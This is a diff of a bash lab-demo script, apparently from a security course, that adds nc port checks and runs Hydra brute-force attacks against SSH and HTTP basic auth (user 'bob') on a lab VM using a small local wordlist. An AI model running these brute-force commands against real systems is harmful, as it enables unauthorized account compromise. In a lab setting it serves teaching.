@@ -22,8 +22,14 @@ echo ""
 echo "=========================================================="
 echo "[+] Part 1: SSH Brute-Force Password Cracking"
 echo "=========================================================="
-echo "[*] Step 1.1: Verifying SSH service availability..."
-nmap -sV -p 22 "$TARGET_SSH_IP" || true
+echo "[*] Step 1.1: Checking SSH port availability with 3-second timeout..."
+if ! nc -z -w 3 "$TARGET_SSH_IP" 22 &>/dev/null; then
+    echo "[-] Warning: SSH target $TARGET_SSH_IP:22 is not reachable."
+    echo "    Make sure the Matrix-1 VM is running and on the same subnet."
+    echo "    (You can pass your current target IP: ./run_demo.sh <TARGET_IP>)"
+else
+    echo "[+] SSH port 22 is open on $TARGET_SSH_IP."
+fi
 
 echo ""
 echo "[*] Step 1.2: Launching Hydra SSH attack..."
@@ -34,24 +40,18 @@ echo ""
 echo "=========================================================="
 echo "[+] Part 2: HTTP Basic Authentication Cracking"
 echo "=========================================================="
-# Check rockyou wordlist or fallback to local wordlist
-ROCKYOU="/usr/share/wordlists/rockyou.txt"
-if [ ! -f "$ROCKYOU" ]; then
-    if [ -f "/usr/share/wordlists/rockyou.txt.gz" ]; then
-        echo "[*] Decompressing /usr/share/wordlists/rockyou.txt.gz..."
-        sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz
-    else
-        ROCKYOU="wordlist.txt"
-    fi
-fi
+echo "[*] Using focused lab dictionary: wordlist.txt (50 fast candidate passwords)"
+echo "[*] Target Endpoint: http://$TARGET_HTTP_IP/protected"
 
-echo "[*] Using Wordlist: $ROCKYOU"
-echo "[*] Running Hydra against HTTP-GET /protected for user 'bob'..."
-echo "Command: hydra -l bob -P $ROCKYOU -t 4 $TARGET_HTTP_IP http-get /protected"
-hydra -l bob -P "$ROCKYOU" -t 4 "$TARGET_HTTP_IP" http-get /protected || true
+if ! nc -z -w 3 "$TARGET_HTTP_IP" 80 &>/dev/null; then
+    echo "[-] Notice: $TARGET_HTTP_IP:80 is not currently active."
+    echo "    (If demonstrating offline, you can run the local HTTP auth service in Assignment 06!)"
+else
+    echo "[+] Target HTTP service is active. Running attack..."
+    hydra -l bob -P wordlist.txt -t 4 "$TARGET_HTTP_IP" http-get /protected || true
+fi
 
 echo ""
 echo "=========================================================="
-echo "[+] Password Cracking Simulation Completed."
+echo "[+] Password Cracking Simulation Routine Completed."
 echo "=========================================================="
-
